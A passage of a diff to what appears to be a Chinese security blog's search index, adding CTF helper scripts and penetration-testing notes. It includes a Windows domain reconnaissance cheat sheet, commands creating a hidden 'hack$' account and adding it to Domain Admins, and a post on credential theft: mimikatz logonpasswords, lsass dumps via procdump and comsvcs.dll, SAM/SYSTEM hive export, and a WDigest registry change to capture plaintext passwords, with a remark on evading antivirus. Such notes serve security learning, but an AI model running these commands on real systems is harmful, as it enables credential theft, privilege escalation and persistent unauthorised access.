class="built_in">print</span>(req2.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>法二</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-   </span></span><br><span class="line"><span class="comment"># hack the box web1 re.findall</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5_str</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    md=hashlib.md5();</span><br><span class="line">    md.update(<span class="built_in">str</span>.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> md.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://138.68.182.108:31255/&quot;</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=3brhsrsfuq7k869bg9s7bae6u4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://138.68.182.108:31255&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req1 = requests.get(url,headers=head)</span><br><span class="line"><span class="built_in">str</span> = re.findall(<span class="string">r&#x27;&lt;h3 align=.*&gt;(.*?)&lt;/h3&gt;&#x27;</span>,req1.text,re.S)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#print(str)</span></span><br><span class="line">mdstr=md5_str(<span class="built_in">str</span>)</span><br><span class="line"><span class="comment">#print(mdstr)</span></span><br><span class="line">req2=requests.post(url,headers=head,data=<span class="string">&quot;hash=&quot;</span>+mdstr)</span><br><span class="line"><span class="comment">#print(req2.text)</span></span><br><span class="line">flag=<span class="string">&quot;HTB&#123;&quot;</span>+re.findall(<span class="string">&#x27;HTB\&#123;(.*?)\&#125;&#x27;</span>,req2.text,re.S)[<span class="number">0</span>]+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/10/python-study/1.1.png" alt="1.1"></p>
+<h2 id="0x02-scan-dir目录扫描"><a href="#0x02-scan-dir目录扫描" class="headerlink" title="0x02 scan_dir目录扫描"></a>0x02 scan_dir目录扫描</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0&#x27;</span>&#125;</span><br><span class="line">url = sys.argv[<span class="number">1</span>]   </span><br><span class="line">zidian = sys.argv[<span class="number">2</span>]</span><br><span class="line">result = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(zidian,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        line = line.strip()</span><br><span class="line">        r =requests.get(url+line,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;url:&quot;</span>+r.url+<span class="string">&quot;\n   exist&quot;</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(result,<span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">                f1.write(<span class="string">&quot;url:&quot;</span>+r.url+<span class="string">&quot;    exist\n&quot;</span>)    //写入result.txt</span><br><span class="line">        <span class="keyword">else</span>:<span class="built_in">print</span>(<span class="string">&quot;url:&quot;</span>+r.url +<span class="string">&quot;\n   false&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>python  scan_dir.py  <a href="http://www.shmilying.top/">http://www.shmilying.top/</a>  F:\pycharm\python-study\zidian.txt   F:\pycharm\python-study\result.txt</p>
+<p>result:</p>
+<p><img src="/2021/01/10/python-study/2.0.png" alt="2.0"></p>
+<p><img src="/2021/01/10/python-study/2.1.png" alt="2.1"></p>
+<h2 id="0x03-file-open-r-w-a"><a href="#0x03-file-open-r-w-a" class="headerlink" title="0x03 file_open_r/w/a"></a>0x03 file_open_r/w/a</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">***read***</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> f():</span><br><span class="line">        <span class="built_in">print</span>(a.strip())       <span class="comment">#最实用,方便，而且效果和下面的一样。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="built_in">print</span>(line.strip())     <span class="comment">#比较方便</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():  <span class="comment">#读取全部  == for line in f：</span></span><br><span class="line">    <span class="built_in">print</span>(line)</span><br><span class="line">    <span class="built_in">print</span>(line.strip())  <span class="comment">#去除空行</span></span><br><span class="line">f.close()                 <span class="comment">#记得关闭</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">line1 = f.readline()        <span class="comment">#读一行</span></span><br><span class="line"><span class="built_in">print</span>(line1)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">line2 = f.read(<span class="number">1</span>)           <span class="comment">#读字节</span></span><br><span class="line"><span class="built_in">print</span>(line2)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">***write***</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)          <span class="comment">#open(&quot;zidian.txt&quot;,&quot;a&quot;) 在末尾追加,不影响原来的</span></span><br><span class="line">f.write(<span class="string">&#x27;\nxxxxx&#x27;</span>)                  <span class="comment">#open(&quot;zidian.txt&quot;,&quot;w&quot;) w:写入内容会覆盖原有内容</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&quot;zidian.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f2.readlines():</span><br><span class="line">    <span class="built_in">print</span>(line.strip())</span><br><span class="line">f2.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>总结：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;c:\filename&quot;</span>,<span class="string">&quot;mode&quot;</span>)   //mode:r/w/a</span><br><span class="line">xxxxxxx</span><br><span class="line">xxxxxxx</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04awd-sendflag"><a href="#0x04awd-sendflag" class="headerlink" title="0x04awd_sendflag"></a>0x04awd_sendflag</h2><p>学习的大佬脚本，批量sendflag。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span>-<span class="title">flag</span>(<span class="params">flag</span>):</span>      //自定义函数</span><br><span class="line"></span><br><span class="line">    url=<span class="string">&quot;http://xx.xxx.xxx.xx:8080/api/v1/challenges/attempt&quot;</span></span><br><span class="line">    <span class="comment">#data=&#123;&quot;challenge_id&quot;:2,&quot;submission&quot;:&quot;&quot;+flag+&quot;&quot;&#125;</span></span><br><span class="line">    data=<span class="string">&#x27;&#123;&quot;challenge_id&quot;:2,&quot;submission&quot;:&quot;&#x27;</span>+flag+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">    h = &#123;</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line"><span class="string">&quot;CSRF-Token&quot;</span>:<span class="string">&quot;e9817606c5e5373499bd7e43b64c045b60a276b839b340c4f4a37c2eb27f4e8a&quot;</span>,</span><br><span class="line"><span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line"><span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">    cookies=&#123;<span class="string">&quot;session&quot;</span>:<span class="string">&quot;2deefa03-cda6-41fc-be25-a986067c7048&quot;</span>,<span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;jnr3quolg5o2ohlifbdld6bku5&quot;</span>&#125;</span><br><span class="line">    req=requests.post(url=url,data=data,cookies=cookies,headers=h)</span><br><span class="line">    <span class="built_in">print</span>(req.text)        //result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flagtxt</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;web1-flag.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> f:</span><br><span class="line">            <span class="built_in">print</span>(a.strip())</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            result-flag(a.strip())</span><br><span class="line">            </span><br><span class="line">flagtxt()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x05-生成以指定字符为开头的md5值"><a href="#0x05-生成以指定字符为开头的md5值" class="headerlink" title="0x05 生成以指定字符为开头的md5值"></a>0x05 生成以指定字符为开头的md5值</h2><ul>
+<li>百度的</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># 脚本功能：生成以指定字符为开头的md5值（x位数字）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryption</span>(<span class="params">chars</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(chars.encode(<span class="string">&quot;utf8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(random.randint(<span class="number">11111111</span>,<span class="number">99999999</span>))  <span class="comment">#爆破范围</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    start = <span class="string">&quot;66666&quot;</span>  <span class="comment">#md5指定前几位</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        strs = generate()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Test %s &quot;</span> % strs)</span><br><span class="line">        <span class="keyword">if</span> encryption(strs).startswith(start):</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;yes!&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[+] %s &quot;</span> % strs + <span class="string">&quot;%s &quot;</span> % encryption(strs))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;no!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;完成！&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>结果如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yes!</span><br><span class="line">[+] 43650254 66666b9c81d0d15f983ad8963908ce10 </span><br><span class="line">完成！</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>白帽python</tag>
       </tags>
   </entry>
   <entry>
@@ -1405,7 +1480,7 @@
   <entry>
     <title>内网信息收集</title>
     <url>/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
-    <content><![CDATA[<h2 id="windows信息收集"><a href="#windows信息收集" class="headerlink" title="windows信息收集"></a>windows信息收集</h2><h4 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line"></span><br><span class="line">ipconfig &#x2F;all  #是否在域内，网卡信息等</span><br><span class="line"></span><br><span class="line">systeminfo  #查看主机信息，os名称，版本，域，补丁</span><br><span class="line">（要提取的话根据补丁，寻找https:&#x2F;&#x2F;i.hacking8.com&#x2F;tiquan）</span><br><span class="line"></span><br><span class="line">net user       #本机用户列表</span><br><span class="line">net localgroup administrators  #本地管理员</span><br><span class="line"></span><br><span class="line">wmic product get name,version   #查看安装软件版本</span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,Version&quot;          #查看安装软件版本</span><br><span class="line"></span><br><span class="line">tasklist       # 默认显示映像名称，PID，会话名，会话，内存使用</span><br><span class="line">tasklist &#x2F;svc  # 显示PID，服务  </span><br><span class="line">（查看是否有杀软 https:&#x2F;&#x2F;www.ddosi.com&#x2F;av&#x2F;1.php）</span><br><span class="line"></span><br><span class="line">netstat -nao               #查看端口</span><br><span class="line">netstat -an | find “3389”  #查看对应端口</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I|findstr “TTL&#x3D;”</span><br></pre></td></tr></table></figure>
+    <content><![CDATA[<h2 id="windows信息收集"><a href="#windows信息收集" class="headerlink" title="windows信息收集"></a>windows信息收集</h2><h2 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line"></span><br><span class="line">ipconfig &#x2F;all  #是否在域内，网卡信息等</span><br><span class="line"></span><br><span class="line">systeminfo  #查看主机信息，os名称，版本，域，补丁</span><br><span class="line">（要提取的话根据补丁，寻找https:&#x2F;&#x2F;i.hacking8.com&#x2F;tiquan）</span><br><span class="line"></span><br><span class="line">net user       #本机用户列表</span><br><span class="line">net localgroup administrators  #本地管理员</span><br><span class="line"></span><br><span class="line">wmic product get name,version   #查看安装软件版本</span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,Version&quot;          #查看安装软件版本</span><br><span class="line"></span><br><span class="line">tasklist       # 默认显示映像名称，PID，会话名，会话，内存使用</span><br><span class="line">tasklist &#x2F;svc  # 显示PID，服务  </span><br><span class="line">（查看是否有杀软 https:&#x2F;&#x2F;www.ddosi.com&#x2F;av&#x2F;1.php）</span><br><span class="line"></span><br><span class="line">netstat -nao               #查看端口</span><br><span class="line">netstat -an | find “3389”  #查看对应端口</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I|findstr “TTL&#x3D;”</span><br></pre></td></tr></table></figure>
 
 <span id="more"></span>
 
@@ -1431,15 +1506,15 @@
 
 
 
+<h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;l %i in (1,1,255) do @ping -w 2 -n 1 192.168.119.%i | findstr “TTL&#x3D;”</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220325145246713.png" alt="image-20220325145246713"></p>
+<h4 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qusery process 显示活动的后台进程信息</span><br><span class="line"></span><br><span class="line">query Session   查询建立的session连接</span><br><span class="line"></span><br><span class="line">query user  显示有关登录到系统的所有用户的信息</span><br></pre></td></tr></table></figure>
 
 
 
-
-
-
-
-
-<h4 id="域的信息收集"><a href="#域的信息收集" class="headerlink" title="域的信息收集"></a>域的信息收集</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user &#x2F;domain           #查询域用户 (通过samr，利用的RPC接口)</span><br><span class="line">net view                   #查看域信息</span><br><span class="line">net view &#x2F;domain           #查看主域信息</span><br><span class="line">net accounts &#x2F;domain       #获取与密码信息(策略)</span><br><span class="line"></span><br><span class="line">net group &#x2F;domain                            #查询域内组</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain         #查看域内所有的主机名</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain       #查看域控</span><br><span class="line">net group &quot;domain admins&quot;   &#x2F;domain          #查看域管理员</span><br><span class="line">net group &quot;enterpriser admins&quot;   &#x2F;domain     #查看企业管理用户</span><br><span class="line">net config workstation      #主机名，主机版本，工作站域，工作站域dns-name,当前登录域</span><br><span class="line"></span><br><span class="line">nslookup god.org            #可以定位域控</span><br><span class="line"></span><br><span class="line">net share                   #查看本地共享资源</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220326143716341.png" alt="image-20220326143716341"></p>
+<h2 id="域的信息收集"><a href="#域的信息收集" class="headerlink" title="域的信息收集"></a>域的信息收集</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user &#x2F;domain           #查询域用户 (通过samr，利用的RPC接口)</span><br><span class="line">net view                   #查看域信息</span><br><span class="line">net view &#x2F;domain           #查看主域信息</span><br><span class="line">net accounts &#x2F;domain       #获取与密码信息(策略)</span><br><span class="line"></span><br><span class="line">net group &#x2F;domain                            #查询域内组</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain         #查看域内所有的主机名</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain       #查看域控</span><br><span class="line">net group &quot;domain admins&quot;   &#x2F;domain          #查看域管理员</span><br><span class="line">net group &quot;enterpriser admins&quot;   &#x2F;domain     #查看企业管理用户</span><br><span class="line">net config workstation      #主机名，主机版本，工作站域，工作站域dns-name,当前登录域</span><br><span class="line"></span><br><span class="line">nslookup god.org            #可以定位域控</span><br><span class="line"></span><br><span class="line">net share                   #查看本地共享资源</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 
@@ -1450,8 +1525,7 @@
 <p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621105024.png" alt="20210621105024"></p>
 <p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621111006.png" alt="20210621111006"></p>
 <p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621112521.png" alt="20210621112521"></p>
-<p>查询域内的SPN。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前域内所有的SPN：setspn  -Q  *&#x2F;*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看指定域xie.com注册的SPN：setspn -T xxxxx.god -Q *&#x2F;*      如果指定域不存在，则默认切换到查找本域的SPN</span><br><span class="line"></span><br><span class="line">setspn -L username</span><br><span class="line">setspn -L hostname   查询用户  或者主机名注册的spn</span><br></pre></td></tr></table></figure>
+<h4 id="查询域内的SPN。"><a href="#查询域内的SPN。" class="headerlink" title="查询域内的SPN。"></a>查询域内的SPN。</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前域内所有的SPN：setspn  -Q  *&#x2F;*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看指定域xie.com注册的SPN：setspn -T xxxxx.god -Q *&#x2F;*      如果指定域不存在，则默认切换到查找本域的SPN</span><br><span class="line"></span><br><span class="line">setspn -L username</span><br><span class="line">setspn -L hostname   查询用户  或者主机名注册的spn</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220303175201822.png" alt="image-20220303175201822"></p>
 <p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220303175812371.png" alt="image-20220303175812371"></p>
@@ -1460,8 +1534,7 @@
 <p><a href="https://jwt1399.top/posts/25535.html#toc-heading-14">Attck1</a></p>
 <p><a href="https://mp.weixin.qq.com/s/aXEJpZVxxSkFUfG8TqsxHw">内网渗透学习导航</a></p>
 <p><a href="https://mp.weixin.qq.com/s/l6AajnxFp8GMIYqVcN4SGg">参考1</a></p>
-<p>命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user hack 123qwe... &#x2F;add &#x2F;domain   #创建普通域用户</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Admins&quot; hack &#x2F;add &#x2F;domain   #将普通域用户 提升为域管理</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user hack$ 123qwe... &#x2F;add &#x2F;domain   #创建普通域用户</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Admins&quot; hack$ &#x2F;add &#x2F;domain   #将普通域用户 提升为域管理</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -1469,6 +1542,58 @@
       </categories>
       <tags>
         <tag>内网信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网抓hash/密码</title>
+    <url>/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/</url>
+    <content><![CDATA[<h1 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h1><p>需要管理员权限</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325161740275.png" alt="image-20220325161740275"></p>
+<p>可分为两步：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug             提升权限</span><br><span class="line">sekurlsa::logonpasswords     抓密码</span><br></pre></td></tr></table></figure>
+
+<h1 id="各种dump-mimikatz"><a href="#各种dump-mimikatz" class="headerlink" title="各种dump+mimikatz"></a>各种dump+mimikatz</h1><h3 id="procdump"><a href="#procdump" class="headerlink" title="procdump"></a>procdump</h3><p>(官方软件)</p>
+<p>有杀软的情况procdump不会被杀，但产生的lsass.dmp会可能被清除 （wdf下面会）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp   #然后将lsass.dmp下载到本地</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">procdump64.exe -accepteula -ma [lsass.exe的PID] lsass.dmp</span><br><span class="line">(mimikatz.exe &quot;sekurlsa::minidump dump path &quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325150155475.png" alt="image-20220325150155475"></p>
+<h3 id="rundll32-exe"><a href="#rundll32-exe" class="headerlink" title="rundll32.exe"></a>rundll32.exe</h3><p>(Windows自带)  powershell 下运行comsvcs.dll 的MiniDump 来dump</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
+
+<p>但要绕过AMSI</p>
+<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325172436533.png" alt="image-20220325172436533"></p>
+<h3 id="AvDump"><a href="#AvDump" class="headerlink" title="AvDump"></a>AvDump</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AvDump.exe --pid &lt;lsass pid&gt; --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\Users\admin\Desktop\lsass.dmp --min_interval 0</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="导出本地SAM-mimikatz"><a href="#导出本地SAM-mimikatz" class="headerlink" title="导出本地SAM+mimikatz"></a>导出本地SAM+mimikatz</h1><p>导出本地sam数据库数据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM </span><br></pre></td></tr></table></figure>
+
+<p>mimikatz读取即可</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325171109114.png" alt="image-20220325171109114"></p>
+<h1 id="rdp明文凭据"><a href="#rdp明文凭据" class="headerlink" title="rdp明文凭据"></a>rdp明文凭据</h1><p>参考:<a href="https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/">https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/</a></p>
+<p>(<a href="https://loong716.top/posts/lsass/#2-%E7%AD%BE%E5%90%8D%E7%99%BD%E5%90%8D%E5%8D%95%E6%96%87%E4%BB%B6dum">https://loong716.top/posts/lsass/#2-签名白名单文件dum</a></p>
+<h1 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h1><ol>
+<li>winserver2012以后只能抓到用户hash，抓不到明文</li>
+</ol>
+<p>但可以通过修改注册表，下次目标重启即可抓到明文</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>mimikatz要免杀</li>
+</ol>
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网抓hash/密码</tag>
       </tags>
   </entry>
   <entry>
